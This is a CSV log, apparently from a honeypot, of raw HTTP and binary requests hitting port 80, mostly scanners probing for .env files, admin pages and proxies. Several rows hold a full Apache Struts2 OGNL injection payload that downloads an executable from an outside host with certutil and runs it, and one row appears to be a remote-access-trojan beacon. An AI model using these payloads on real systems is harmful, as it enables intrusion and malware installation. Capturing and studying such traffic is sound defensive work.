ID,ADDR,VALUE,TIME
REQ_1_P80,,b'',2022-05-03 00:05:56.772458
REQ_2_P80,,"b""GET /index.action HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cmd.exe /c certutil.exe -urlcache -split -f http://fid.hognoob.se/download.exe C:/Windows/temp/poaoaistcanaqux11919.exe & cmd.exe /c C:/Windows/temp/poaoaistcanaqux11919.exe').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\r\nAccept: */*\r\nAccept-Language: zh-cn\r\nReferer: http://3.14.69.228:80/index.action\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)\r\nHost: 3.14.69.228\r\n\r\n""",2022-05-03 00:05:56.772458
REQ_3_P80,,b'\x04\x01\x00P\x05\xbc\xd2e\x00',2022-05-03 00:05:56.772458
REQ_4_P80,,b'GET / HTTP/1.1\r\nHost: 3.14.69.228\r\nUser-Agent: Mozilla/5.0 zgrab/0.x\r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n',2022-05-03 00:05:56.772458
REQ_5_P80,,b'\x05\x01\x00',2022-05-03 00:05:56.772458
REQ_6_P80,,b'GET / HTTP/1.1\r\nHost: 3.14.69.228:80\r\nUser-Agent: Go-http-client/1.1\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n',2022-05-03 00:05:56.772458
REQ_7_P80,,"b'GET /favicon.ico HTTP/1.1\r\nHost: 3.14.69.228\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36\r\nAccept: image/webp,image/apng,image/*,*/*;q=0.8\r\nReferer: http://3.14.69.228/login.cgi\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en-IN;q=0.9,en;q=0.8\r\n\r\n'",2022-05-03 00:05:56.772458
REQ_8_P80,,"b'GET /login.cgi HTTP/1.1\r\nHost: 3.14.69.228\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en-IN;q=0.9,en;q=0.8\r\n\r\n'",2022-05-03 00:05:56.772458
REQ_9_P80,,"b""GET /index.do HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cmd.exe /c certutil.exe -urlcache -split -f http://fid.hognoob.se/download.exe C:/Windows/temp/poaoaistcanaqux11919.exe & cmd.exe /c C:/Windows/temp/poaoaistcanaqux11919.exe').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\r\nAccept: */*\r\nAccept-Language: zh-cn\r\nReferer: http://3.14.69.228:80/index.do\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)\r\nHost: 3.14.69.228\r\n\r\n""",2022-05-03 00:05:56.772458
REQ_10_P80,,"b'GET http://110.249.212.46/testget?q=23333&port=80 HTTP/1.1\r\nCache-Control: no-cache, no-store, must-revalidate\r\nPragma: no-cache\r\nExpires: 0\r\n\r\n'",2022-05-03 00:05:56.772458
REQ_11_P80,,"b""GET /struts2-rest-showcase/orders.xhtml HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cmd.exe /c certutil.exe -urlcache -split -f http://fid.hognoob.se/download.exe C:/Windows/temp/poaoaistcanaqux11919.exe & cmd.exe /c C:/Windows/temp/poaoaistcanaqux11919.exe').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\r\nAccept: */*\r\nAccept-Language: zh-cn\r\nReferer: http://3.14.69.228:80/struts2-rest-showcase/orders.xhtml\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)\r\nHost: 3.14.69.228\r\n\r\n""",2022-05-03 00:05:56.780875
REQ_12_P80,,b'GET / HTTP/1.1\r\nHost: 3.14.69.228\r\nUser-Agent: HTTP Banner Detection (https://security.ipip.net)\r\nConnection: close\r\n\r\n',2022-05-03 00:05:56.780875
REQ_13_P80,,b'\x01\x02\x03\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',2022-05-03 00:05:56.780875
REQ_14_P80,,"b""145.ll|'|'|SGFjS2VkX0Q0OTkwNjI3|'|'|WIN-JNAPIER0859|'|'|JNapier|'|'|19-02-01|'|'||'|'|Win 7 Professional SP1 x64|'|'|No|'|'|0.7d|'|'|..|'|'|AA==|'|'|112.inf|'|'|SGFjS2VkDQoxOTIuMTY4LjkyLjIyMjo1NTUyDQpEZXNrdG9wDQpjbGllbnRhLmV4ZQ0KRmFsc2UNCkZhbHNlDQpUcnVlDQpGYWxzZQ==12.act|'|'|AA==""",2022-05-03 00:05:56.780875
REQ_15_P80,,"b'GET http://5.188.210.101/echo.php HTTP/1.1\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nPragma: no-cache\r\nCache-control: no-cache\r\nCookie: cookie=ok\r\nReferer: https://www.google.com/\r\nHost: 5.188.210.101\r\nConnection: close\r\nContent-Length: 0\r\n\r\n'",2022-05-03 00:05:56.780875
REQ_16_P80,,b'GET /Lists/admin.php HTTP/1.1\r\nUser-Agent: masscan/1.0 (https://github.com/robertdavidgraham/masscan)\r\nAccept: */*\r\n\r\n',2022-05-03 00:05:56.780875
REQ_17_P80,,"b'GET /login.cgi HTTP/1.1\r\nHost: 3.14.69.228\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en-IN;q=0.9,en;q=0.8\r\n\r\n'",2022-05-03 00:05:56.780875
REQ_18_P80,,"b""GET /index.do HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cmd.exe /c certutil.exe -urlcache -split -f http://fid.hognoob.se/download.exe C:/Windows/temp/idxbslorzqhxpsi29850.exe & cmd.exe /c C:/Windows/temp/idxbslorzqhxpsi29850.exe').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\r\nAccept: */*\r\nAccept-Language: zh-cn\r\nReferer: http://3.14.69.228:80/index.do\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)\r\nHost: 3.14.69.228\r\n\r\n""",2022-05-03 00:05:56.780875
REQ_19_P80,,b'GET / HTTP/1.0\r\nUser-Agent: masscan/1.0 (https://github.com/robertdavidgraham/masscan)\r\nAccept: */*\r\n\r\n',2022-05-03 00:05:56.780875
REQ_20_P80,,b'GET / HTTP/1.0\r\nUser-Agent: NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com\r\nAccept: */*\r\n\r\n',2022-05-03 00:05:56.780875
REQ_21_P80,,"b'GET /manager/html HTTP/1.1\r\nAccept: text/html, application/xhtml+xml, */*\r\nUser-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)\r\nHost: 3.14.69.228:80\r\nAuthorization: Basic Og==\r\nCache-Control: max-stale=0\r\nConnection: Keep-Alive\r\n\r\n'",2022-05-03 00:05:56.796007
REQ_22_P80,,"b""GET /struts2-rest-showcase/orders.xhtml HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cmd.exe /c certutil.exe -urlcache -split -f http://fid.hognoob.se/download.exe C:/Windows/temp/idxbslorzqhxpsi29850.exe & cmd.exe /c C:/Windows/temp/idxbslorzqhxpsi29850.exe').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\r\nAccept: */*\r\nAccept-Language: zh-cn\r\nReferer: http://3.14.69.228:80/struts2-rest-showcase/orders.xhtml\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)\r\nHost: 3.14.69.228\r\n\r\n""",2022-05-03 00:05:56.796007
REQ_23_P80,,"b'GET /login.cgihttp://3.14.69.228/login.cgi HTTP/1.1\r\nHost: 3.14.69.228\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en-IN;q=0.9,en;q=0.8\r\n\r\n'",2022-05-03 00:05:56.796007
REQ_24_P80,,"b""GET /index.action HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cmd.exe /c certutil.exe -urlcache -split -f http://fid.hognoob.se/download.exe C:/Windows/temp/idxbslorzqhxpsi29850.exe & cmd.exe /c C:/Windows/temp/idxbslorzqhxpsi29850.exe').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\r\nAccept: */*\r\nAccept-Language: zh-cn\r\nReferer: http://3.14.69.228:80/index.action\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)\r\nHost: 3.14.69.228\r\n\r\n""",2022-05-03 00:05:56.796007
REQ_25_P80,,"b'GET / HTTP/1.1\r\nHost: 3.14.69.228\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en-IN;q=0.9,en;q=0.8\r\n\r\n'",2022-05-03 00:05:56.796007
REQ_26_P80,,"b'GET /favicon.ico HTTP/1.1\r\nHost: 3.14.69.228\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36\r\nAccept: image/webp,image/apng,image/*,*/*;q=0.8\r\nReferer: http://3.14.69.228/\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en-IN;q=0.9,en;q=0.8\r\n\r\n'",2022-05-03 00:05:56.796007
REQ_27_P80,,b'GET /manager/html HTTP/1.1\r\nConnection: Keep-Alive\r\nAuthorization: Basic YWRtaW46\r\nHost: 3.14.69.228\r\n\r\n',2022-05-03 00:05:56.796007
REQ_28_P80,,"b'GET / HTTP/1.1\r\nHost: 3.14.69.228\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: deflate, gzip, identity\r\nAccept-Language: en-US;q=0.6,en;q=0.4\r\nUser-Agent: Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1\r\n\r\n'",2022-05-03 00:05:56.796007
REQ_29_P80,"('95.234.154.62', 4089)",b'GET / HTTP/1.1\r\nHost: 54.80.75.64\r\nUser-Agent: curl/7.79.1\r\nAccept: */*\r\n\r\n',2022-05-03 20:57:03.624360
REQ_30_P80,"('95.234.154.62', 4094)",b'GET / HTTP/1.1\r\nHost: 54.80.75.64\r\nUser-Agent: curl/7.79.1\r\nAccept: */*\r\n\r\n',2022-05-03 20:58:24.881955
REQ_31_P80,"('95.234.154.62', 4095)",b'GET / HTTP/1.1\r\nHost: 54.80.75.64\r\nUser-Agent: curl/7.79.1\r\nAccept: */*\r\n\r\n',2022-05-03 20:58:27.291330
REQ_32_P80,"('3.19.26.92', 60407)","b'GET /_profiler/phpinfo HTTP/1.1\r\nHost: 54.80.75.64\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\n\r\n'",2022-05-03 21:05:38.796114
REQ_33_P80,"('181.40.72.94', 36860)","b'GET / HTTP/1.1\r\nHost: 54.80.75.64:80\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36\r\nContent-Length: 0\r\n\r\n'",2022-05-03 21:08:02.997805
REQ_34_P80,"('95.234.154.62', 4339)",b'GET / HTTP/1.1\r\nHost: 54.80.75.64\r\nUser-Agent: curl/7.79.1\r\nAccept: */*\r\n\r\n',2022-05-03 21:29:26.677724
REQ_35_P80,"('185.254.196.115', 38912)","b'GET /.env HTTP/1.1\r\nHost: 54.80.75.64\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'",2022-05-03 21:53:26.067931
REQ_36_P80,"('157.230.216.203', 46488)",b'GET /ab2g HTTP/1.1\r\n\r\n',2022-05-03 22:12:14.037100
REQ_37_P80,"('157.230.216.203', 46516)",b'GET /ab2h HTTP/1.1\r\n\r\n',2022-05-03 22:12:14.062397
REQ_38_P80,"('3.145.57.222', 59476)",b'',2022-05-03 22:26:37.935197
REQ_39_P80,"('3.145.57.222', 55852)",b'',2022-05-03 22:26:54.114406
REQ_40_P80,"('3.145.57.222', 55969)",b'',2022-05-03 22:27:10.096455
REQ_41_P80,"('192.241.222.228', 37614)",b'MGLNDD_54.80.75.64_80\n',2022-05-03 22:43:11.969826
REQ_42_P80,"('35.88.195.237', 60505)","b'GET /.env HTTP/1.1\r\nHost: ec2-54-80-75-64.compute-1.amazonaws.com\r\nUser-agent: Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'",2022-05-03 22:49:48.424049
REQ_43_P80,"('104.152.52.151', 58728)",b'GET / HTTP/1.0\r\nUser-Agent: masscan/1.3 (https://github.com/robertdavidgraham/masscan)\r\nAccept: */*\r\n\r\n',2022-05-03 22:58:59.817186
REQ_44_P80,"('185.254.196.115', 52144)","b'GET /.env HTTP/1.1\r\nHost: 54.80.75.64\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'",2022-05-03 23:19:02.828279
REQ_45_P80,"('193.46.255.49', 45294)","b'GET / HTTP/1.1\r\nTE: deflate,gzip;q=0.3\r\nConnection: TE, close\r\nHost: 54.80.75.64:80\r\nUser-Agent: libwww-perl/6.62\r\n\r\n'",2022-05-03 23:22:42.009941
REQ_46_P80,"('45.61.188.169', 34726)","b'GET /config/getuser?index=0 HTTP/1.1\r\nHost: 54.80.75.64:80\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'",2022-05-04 00:10:25.261089
REQ_47_P80,"('185.254.196.218', 50562)","b'GET /.env HTTP/1.1\r\nHost: 54.80.75.64\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'",2022-05-04 00:23:26.126772
REQ_48_P80,"('54.216.248.149', 48192)",b'CONNECT 1.1.1.1:443 HTTP/1.1\r\nHost: 1.1.1.1:443\r\nUser-Agent: Go-http-client/1.1\r\n\r\n',2022-05-04 00:31:34.667675
REQ_49_P80,"('5.239.144.92', 58476)","b'GET / HTTP/1.1\r\nHost: 54.80.75.64:80\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7\r\nContent-Length: 0\r\n\r\n'",2022-05-04 00:40:29.610837
REQ_50_P80,"('185.254.196.115', 42222)","b'GET /.env HTTP/1.1\r\nHost: 54.80.75.64\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'",2022-05-04 00:50:53.432215
REQ_51_P80,"('186.224.251.136', 18876)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:16.639773
REQ_52_P80,"('186.224.251.136', 17878)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:16.920686
REQ_53_P80,"('186.224.251.136', 17885)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:17.215183
REQ_54_P80,"('186.224.251.136', 18101)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:17.587541
REQ_55_P80,"('186.224.251.136', 17202)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:17.871776
REQ_56_P80,"('186.224.251.136', 18249)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:18.174591
REQ_57_P80,"('186.224.251.136', 17607)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:18.601143
REQ_58_P80,"('186.224.251.136', 18815)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:18.879776
REQ_59_P80,"('186.224.251.136', 18223)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:19.178161
REQ_60_P80,"('186.224.251.136', 18293)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:19.609818
